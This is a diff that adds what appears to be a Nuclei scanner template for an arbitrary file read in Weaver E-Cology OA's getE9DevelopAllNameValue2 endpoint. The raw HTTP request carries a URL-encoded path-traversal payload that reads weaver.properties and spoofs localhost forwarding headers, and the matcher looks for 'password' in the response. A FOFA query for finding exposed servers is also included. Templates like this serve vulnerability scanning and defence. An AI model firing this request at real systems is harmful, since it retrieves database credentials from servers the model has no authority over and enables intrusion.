@@ -1,0 +1,34 @@
+id: weaver-ecology-getE9DevelopAllNameValue2-fileread
+info:
+  name: 泛微 OA E-Cology getE9DevelopAllNameValue2 - fileread
+  author: leadlife
+  severity: high
+  description: 泛微getE9DevelopAllNameValue2接口存在任意文件读取漏洞
+  reference: 
+    - thttps://wiki.wy876.cn/#/%E6%B3%9B%E5%BE%AEgetE9DevelopAllNameValue2%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E?id=%e6%b3%9b%e5%be%aegete9developallnamevalue2%e6%8e%a5%e5%8f%a3%e5%ad%98%e5%9c%a8%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e8%af%bb%e5%8f%96%e6%bc%8f%e6%b4%9e
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: app="泛微-OA（e-cology）"
+  tags: weaver,fileread,oa,ecology
+
+
+http:
+  - raw:
+      - |
+        GET /api/portalTsLogin/utils/getE9DevelopAllNameValue2?fileName=portaldev_%2f%2e%2e%2fweaver%2eproperties HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
+        Accept: */*
+        Connection: Keep-Alive
+        X-Forwarded-For: 127.0.0.1
+        X-Originating: 127.0.0.1
+        X-Remote-IP: 127.0.0.1
+        X-Remote-Addr: 127.0.0.1
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'ecology','password')
+        condition: and
